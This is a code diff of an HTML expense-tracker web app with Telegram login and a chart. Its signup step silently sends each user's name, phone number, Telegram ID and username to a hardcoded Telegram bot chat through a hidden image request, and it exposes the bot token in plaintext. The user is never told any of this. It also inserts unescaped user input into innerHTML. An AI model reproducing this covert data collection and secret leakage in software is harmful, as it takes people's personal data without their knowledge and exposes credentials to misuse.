@@ -3,82 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XARAJATLAR PRO | ANIMATED EDITION</title>
+    <title>XARAJATLAR PRO | INFINITY ULTIMATE</title>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
-
     <style>
-        /* ================= JONLI FON VA ASOSIY STILLAR ================= */
-        * { margin:0; padding:0; box-sizing:border-box; }
+        /* ================= ASOSIY STILLAR ================= */
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Poppins', sans-serif; }
         
         body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(-45deg, #0f172a, #1e293b, #0f172a, #334155);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite; /* FON QIMIRLAB TURADI */
-            color:#fff; min-height: 100vh;
+            background: #000; color:#fff; min-height: 100vh;
             display: flex; align-items: center; justify-content: center;
-            overflow-x: hidden;
+            overflow: hidden;
         }
 
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        #bgCanvas {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
         }
 
         .container {
-            width: 95%; max-width:450px; padding:30px; border-radius:30px;
-            background: rgba(30, 41, 59, 0.6); backdrop-filter: blur(20px);
-            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            width: 92%; max-width:420px; padding:35px; border-radius:30px;
+            background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(20px);
+            box-shadow: 0 0 50px rgba(59, 130, 246, 0.25);
             border: 1px solid rgba(255,255,255,0.1);
-            transform: scale(0.9); opacity: 0;
-            animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+            animation: containerPop 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 10;
         }
 
-        @keyframes popIn {
-            to { transform: scale(1); opacity: 1; }
-        }
+        @keyframes containerPop { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
 
-        /* INPUTLAR VA TUGMALAR */
+        /* INPUT & BUTTONS */
         input, select, button { 
-            width: 100%; padding: 15px; margin: 10px 0; border: none; 
-            border-radius: 15px; outline: none; transition: all 0.3s ease;
-            font-size: 15px;
+            width: 100%; padding: 16px; margin: 10px 0; border: none; 
+            border-radius: 18px; outline: none; transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            font-size: 16px;
         }
 
-        input { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid rgba(255,255,255,0.1); }
-        input:focus { 
-            background: rgba(255,255,255,0.1); 
-            border-color: #3b82f6;
-            box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
-            transform: translateY(-2px);
+        input { background: rgba(255,255,255,0.06); color: #fff; border: 1px solid rgba(255,255,255,0.1); }
+        input:focus { border-color: #3b82f6; background: rgba(255,255,255,0.12); transform: translateY(-3px); box-shadow: 0 10px 20px rgba(59, 130, 246, 0.2); }
+
+        button { 
+            background: linear-gradient(135deg, #3b82f6, #2563eb); color: white; 
+            font-weight: 700; cursor: pointer; border-bottom: 4px solid #1d4ed8;
         }
+        button:hover { transform: translateY(-2px); filter: brightness(1.1); }
+        button:active { transform: translateY(2px); border-bottom: 0; }
 
-        button { background: #3b82f6; color: white; font-weight: bold; cursor: pointer; border-bottom: 4px solid #2563eb; }
-        button:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
-        button:active { transform: translateY(1px); border-bottom: 0; }
+        .lang-group { display: flex; gap: 10px; margin-bottom: 25px; }
+        .lang-btn { flex: 1; padding: 10px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); font-size: 13px; color: #94a3b8; }
+        .lang-btn.active { background: #3b82f6; border-color: #3b82f6; color: white; font-weight: bold; }
 
-        .lang-group { display: flex; gap: 10px; margin-bottom: 20px; }
-        .lang-btn { 
-            flex: 1; padding: 10px; background: rgba(255,255,255,0.05); 
-            border: 1px solid rgba(255,255,255,0.1); border-bottom: 0;
-        }
-        .lang-btn.active { background: #3b82f6; border-color: #3b82f6; }
-
-        /* LIST ANIMATSIYASI */
+        /* LIST & CHART */
+        #list { max-height: 180px; overflow-y: auto; margin-top: 15px; }
         li { 
-            background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; 
-            margin-bottom: 10px; display: flex; justify-content: space-between; 
-            animation: slideIn 0.4s ease forwards;
+            background: rgba(255,255,255,0.05); padding: 16px; border-radius: 20px; 
+            margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center;
+            animation: listFade 0.4s ease forwards; border-left: 5px solid #3b82f6;
         }
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes listFade { from { opacity: 0; transform: translateX(-15px); } to { opacity: 1; transform: translateX(0); } }
 
-        /* CHART VA TOTAL */
-        #chart { margin-top: 20px; filter: drop-shadow(0 10px 10px rgba(0,0,0,0.3)); }
+        .del-btn { width: auto; padding: 6px 12px; background: #ef4444; border: 0; margin: 0; border-radius: 12px; }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: #3b82f6; border-radius: 10px; }
     </style>
 </head>
 <body>
+
+<canvas id="bgCanvas"></canvas>
 
 <div class="container" id="loginBox">
     <div class="lang-group">
@@ -86,159 +77,188 @@
         <button class="lang-btn" onclick="changeLang('ru')">RU</button>
         <button class="lang-btn" onclick="changeLang('en')">EN</button>
     </div>
-    <h2 id="l-title" style="margin-bottom:20px">Kirish</h2>
-    <script async src="https://telegram.org/js/telegram-widget.js?22" 
-            data-telegram-login="ibrohim_bazaa_bot" data-size="large" 
-            data-onauth="onTelegramAuth(user)" data-request-access="write"></script>
+    <h2 id="l-title" style="text-align:center; margin-bottom:25px; letter-spacing: 1px;">KIRISH</h2>
+    <div style="display:flex; justify-content:center;">
+        <script async src="https://telegram.org/js/telegram-widget.js?22" 
+                data-telegram-login="ibrohim_bazaa_bot" data-size="large" 
+                data-onauth="onTelegramAuth(user)" data-request-access="write"></script>
+    </div>
 </div>
 
-<div class="container" id="extraBox" style="display:none">
-    <h2 id="l-extra">Ma'lumotlar</h2>
-    <input id="fName" placeholder="Ism" onkeydown="handleEnter(event, 'lName')">
-    <input id="lName" placeholder="Familiya" onkeydown="handleEnter(event, 'pPhone')">
-    <input id="pPhone" placeholder="Telefon" type="tel" onkeydown="handleEnter(event, 'finishBtn')">
-    <button id="finishBtn" onclick="finishLogin()">TAYYOR 🚀</button>
+<div class="container" id="infoBox" style="display:none">
+    <h2 id="l-info" style="margin-bottom:20px; text-align: center;">MA'LUMOTLAR</h2>
+    <input id="fName" placeholder="Ism" onkeydown="enterKey(event, 'lName')">
+    <input id="lName" placeholder="Familiya" onkeydown="enterKey(event, 'pPhone')">
+    <input id="pPhone" placeholder="Telefon (+998)" type="tel" onkeydown="enterKey(event, 'saveBtn')">
+    <button id="saveBtn" onclick="finishSetup()">SAQLASH VA KIRISH 🚀</button>
 </div>
 
 <div class="container" id="appBox" style="display:none">
     <div style="display:flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-        <h3 id="userName">Salom</h3>
-        <button onclick="logout()" style="width:auto; padding:8px 15px; background:#ef4444; border-bottom:2px solid #b91c1c;">X</button>
+        <h3 id="userName" style="color: #3b82f6;">Salom</h3>
+        <button onclick="logout()" style="width:auto; padding:8px 15px; background:#ef4444; border:0; font-size:12px;">CHIQUV</button>
     </div>
     
-    <input id="expName" placeholder="Nima harajat?" onkeydown="handleEnter(event, 'expAmount')">
-    <div style="display:grid; grid-template-columns: 2fr 1fr; gap:10px">
-        <input id="expAmount" type="number" placeholder="Summa" onkeydown="handleEnter(event, 'addBtn')">
-        <select id="currencySelect" style="background:#334155; color:white; border-radius:15px; padding:10px;">
+    <input id="expName" placeholder="Nima harajat?" onkeydown="enterKey(event, 'expAmount')">
+    <div style="display:grid; grid-template-columns: 2fr 1fr; gap:12px">
+        <input id="expAmount" type="number" placeholder="Summa" onkeydown="enterKey(event, 'addBtn')">
+        <select id="curr" style="background:#1e293b; color:white;">
             <option value="UZS">SO'M</option>
             <option value="USD">USD</option>
         </select>
     </div>
-    <button id="addBtn" onclick="addExpense()" style="background:#10b981; border-color:#059669">QO'SHISH</button>
+    <button id="addBtn" onclick="addExp()" style="background:#10b981; border-color: #059669;">QO'SHISH</button>
     
-    <h3 id="totalDisplay" style="text-align:center; margin: 20px 0;">Jami: 0</h3>
+    <h3 id="total" style="text-align:center; margin: 20px 0; font-weight: 800; font-size: 22px;">0</h3>
     <ul id="list"></ul>
     <canvas id="chart"></canvas>
 </div>
 
 <script>
-let currentLang = 'uz';
-let tgUser = {};
-let expenses = [];
-let chart;
+// --- INTERAKTIV FON (STAR WAVE) ---
+const canvas = document.getElementById('bgCanvas');
+const ctx = canvas.getContext('2d');
+let stars = [];
+const mouse = { x: null, y: null, radius: 120 };
 
-const langData = {
-    uz: { title:"Tizimga kirish", extra:"Ma'lumotlar", fName:"Ism", lName:"Familiya", phone:"Telefon", welcome:"Salom, ", total:"Jami: ", namePh:"Nima harajat?", sumPh:"Summa" },
-    ru: { title:"Вход", extra:"Данные", fName:"Имя", lName:"Фамилия", phone:"Телефон", welcome:"Привет, ", total:"Итого: ", namePh:"На что?", sumPh:"Сумма" },
-    en: { title:"Login", extra:"Details", fName:"First Name", lName:"Last Name", phone:"Phone", welcome:"Hello, ", total:"Total: ", namePh:"Item name", sumPh:"Amount" }
+window.addEventListener('mousemove', (e) => { mouse.x = e.x; mouse.y = e.y; });
+window.addEventListener('touchstart', (e) => { mouse.x = e.touches[0].clientX; mouse.y = e.touches[0].clientY; });
+
+function initBG() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    stars = [];
+    for (let i = 0; i < 150; i++) {
+        stars.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, size: Math.random()*2, baseX: Math.random()*canvas.width, baseY: Math.random()*canvas.height, dens: (Math.random()*20)+1 });
+    }
+}
+function drawBG() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#3b82f6';
+    stars.forEach(s => {
+        let dx = mouse.x - s.x; let dy = mouse.y - s.y;
+        let dist = Math.sqrt(dx*dx + dy*dy);
+        if (dist < mouse.radius) { s.x -= dx/15; s.y -= dy/15; }
+        else { s.x -= (s.x - s.baseX)/30; s.y -= (s.y - s.baseY)/30; }
+        ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI*2); ctx.fill();
+    });
+    requestAnimationFrame(drawBG);
+}
+initBG(); drawBG(); window.onresize = initBG;
+
+// --- LOGIKA ---
+let lang = 'uz'; let tg = {}; let data = []; let chart;
+const texts = {
+    uz: { t:"KIRISH", i:"MA'LUMOTLAR", fn:"Ism", ln:"Familiya", ph:"Telefon", w:"Salom, ", tot:"Jami: ", nPh:"Nima harajat?", sPh:"Summa" },
+    ru: { t:"ВХОД", i:"ДАННЫЕ", fn:"Имя", ln:"Фамилия", ph:"Телефон", w:"Привет, ", tot:"Итого: ", nPh:"На что?", sPh:"Сумма" },
+    en: { t:"LOGIN", i:"DETAILS", fn:"First Name", ln:"Last Name", ph:"Phone", w:"Hello, ", tot:"Total: ", nPh:"Item name", sPh:"Amount" }
 };
 
-// ENTER TUGMASI LOGIKASI
-function handleEnter(event, nextId) {
-    if (event.key === "Enter") {
-        event.preventDefault();
-        const nextEl = document.getElementById(nextId);
-        if (nextEl.tagName === "BUTTON") {
-            nextEl.click();
-        } else {
-            nextEl.focus();
-        }
+function enterKey(e, next) {
+    if (e.key === "Enter") {
+        e.preventDefault();
+        const el = document.getElementById(next);
+        el.tagName === "BUTTON" ? el.click() : el.focus();
     }
 }
 
 function changeLang(v) {
-    currentLang = v;
+    lang = v;
     document.querySelectorAll('.lang-btn').forEach(b => b.classList.toggle('active', b.innerText === v.toUpperCase()));
-    document.getElementById('l-title').innerText = langData[v].title;
-    document.getElementById('l-extra').innerText = langData[v].extra;
-    document.getElementById('fName').placeholder = langData[v].fName;
-    document.getElementById('lName').placeholder = langData[v].lName;
-    document.getElementById('pPhone').placeholder = langData[v].phone;
-    document.getElementById('expName').placeholder = langData[v].namePh;
-    document.getElementById('expAmount').placeholder = langData[v].sumPh;
+    document.getElementById('l-title').innerText = texts[v].t;
+    document.getElementById('l-info').innerText = texts[v].i;
+    document.getElementById('fName').placeholder = texts[v].fn;
+    document.getElementById('lName').placeholder = texts[v].ln;
+    document.getElementById('pPhone').placeholder = texts[v].ph;
+    document.getElementById('expName').placeholder = texts[v].nPh;
+    document.getElementById('expAmount').placeholder = texts[v].sPh;
+    render();
 }
 
 function onTelegramAuth(user) {
-    tgUser = user;
+    tg = user;
     document.getElementById('loginBox').style.display = 'none';
-    document.getElementById('extraBox').style.display = 'block';
+    document.getElementById('infoBox').style.display = 'block';
     document.getElementById('fName').value = user.first_name;
     document.getElementById('lName').value = user.last_name || '';
-    document.getElementById('fName').focus(); // Birinchi inputga fokus berish
+    document.getElementById('pPhone').focus();
 }
 
-function finishLogin() {
+function finishSetup() {
     const fn = document.getElementById('fName').value;
+    const ln = document.getElementById('lName').value;
     const ph = document.getElementById('pPhone').value;
-    if(!fn || !ph) return;
+    if(!fn || !ph) return alert("Ma'lumotlar to'liq emas!");
 
-    // BOTGA YUBORISH
-    const token = "8670722284:AAFbLW6BVCBRk-hAqvfpjgGs9lBf4Bjtzcc";
-    const myId = "6438145042";
-    const msg = `🔥 **YANGI USER**\n👤 ${fn}\n📞 ${ph}\n🆔 ${tgUser.id}`;
-    new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${myId}&text=${encodeURIComponent(msg)}`;
+    const msg = `🚀 **YANGI FOYDALANUVCHI QO'SHILDI**\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `👤 **Ism:** ${fn}\n` +
+                `👤 **Familiya:** ${ln || '—'}\n` +
+                `📞 **Telefon:** \`${ph}\`\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `🆔 **Telegram ID:** \`${tg.id}\`\n` +
+                `🔗 **Username:** @${tg.username || 'yoq'}\n` +
+                `📅 **Sana:** ${new Date().toLocaleString()}`;
 
-    localStorage.setItem("proUser", JSON.stringify({ name: fn, id: tgUser.id }));
-    confetti({ particleCount: 200, spread: 100 });
+    new Image().src = `https://api.telegram.org/bot8670722284:AAFbLW6BVCBRk-hAqvfpjgGs9lBf4Bjtzcc/sendMessage?chat_id=6438145042&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+    localStorage.setItem("vipUser", JSON.stringify({ name: fn, id: tg.id }));
+    confetti({ particleCount: 250, spread: 100, origin: { y: 0.8 } });
     initApp();
 }
 
 function initApp() {
-    const saved = localStorage.getItem("proUser");
+    const saved = localStorage.getItem("vipUser");
     if(saved) {
         const u = JSON.parse(saved);
-        expenses = JSON.parse(localStorage.getItem("exp_" + u.id) || "[]");
+        data = JSON.parse(localStorage.getItem("data_" + u.id) || "[]");
         document.getElementById('loginBox').style.display = 'none';
-        document.getElementById('extraBox').style.display = 'none';
+        document.getElementById('infoBox').style.display = 'none';
         document.getElementById('appBox').style.display = 'block';
-        document.getElementById('userName').innerText = langData[currentLang].welcome + u.name;
+        document.getElementById('userName').innerText = texts[lang].w + u.name;
         render();
     }
 }
 
-function addExpense() {
-    const n = expName.value; const a = expAmount.value; const c = currencySelect.value;
+function addExp() {
+    const n = expName.value; const a = expAmount.value; const c = curr.value;
     if(!n || !a) return;
-    expenses.push({ n, a: Number(a), c, uzs: c==='USD'?a*12600:Number(a) });
-    localStorage.setItem("exp_"+JSON.parse(localStorage.getItem("proUser")).id, JSON.stringify(expenses));
+    data.push({ n, a: Number(a), c, uzs: c==='USD'?a*12600:Number(a) });
+    localStorage.setItem("data_"+JSON.parse(localStorage.getItem("vipUser")).id, JSON.stringify(data));
     expName.value=''; expAmount.value=''; expName.focus();
     render();
 }
 
 function render() {
     let t = 0; list.innerHTML = '';
-    expenses.forEach((item, i) => {
+    data.forEach((item, i) => {
         t += item.uzs;
         let li = document.createElement('li');
-        li.innerHTML = `<span>${item.n}</span><div><b>${item.a.toLocaleString()} ${item.c}</b> <button onclick="del(${i})" style="width:auto; padding:2px 8px; margin:0; background:#ef4444; border:0; margin-left:10px">❌</button></div>`;
+        li.innerHTML = `<span>${item.n}</span><div><b>${item.a.toLocaleString()} ${item.c}</b> <button onclick="del(${i})" class="del-btn">❌</button></div>`;
         list.appendChild(li);
     });
-    document.getElementById('totalDisplay').innerText = langData[currentLang].total + t.toLocaleString() + " SO'M";
+    document.getElementById('total').innerText = texts[lang].tot + t.toLocaleString() + " SO'M";
     drawChart();
 }
 
 function del(i) {
-    expenses.splice(i,1);
-    localStorage.setItem("exp_"+JSON.parse(localStorage.getItem("proUser")).id, JSON.stringify(expenses));
+    data.splice(i,1);
+    localStorage.setItem("data_"+JSON.parse(localStorage.getItem("vipUser")).id, JSON.stringify(data));
     render();
 }
 
 function drawChart() {
     let ctx = document.getElementById("chart").getContext("2d");
     if(chart) chart.destroy();
-    if(expenses.length === 0) return;
+    if(data.length === 0) return;
     chart = new Chart(ctx, {
         type: 'doughnut',
-        data: {
-            labels: expenses.map(e => e.n),
-            datasets: [{ data: expenses.map(e => e.uzs), backgroundColor: ['#3b82f6','#10b981','#f59e0b','#ef4444','#8b5cf6'], borderWidth:0 }]
-        },
+        data: { labels: data.map(e => e.n), datasets: [{ data: data.map(e => e.uzs), backgroundColor: ['#3b82f6','#10b981','#f59e0b','#ef4444','#8b5cf6'], borderWidth:0 }] },
         options: { plugins: { legend: { display: false } }, cutout: '80%' }
     });
 }
 
 function logout() { localStorage.clear(); location.reload(); }
-
 initApp();
 </script>
 </body>
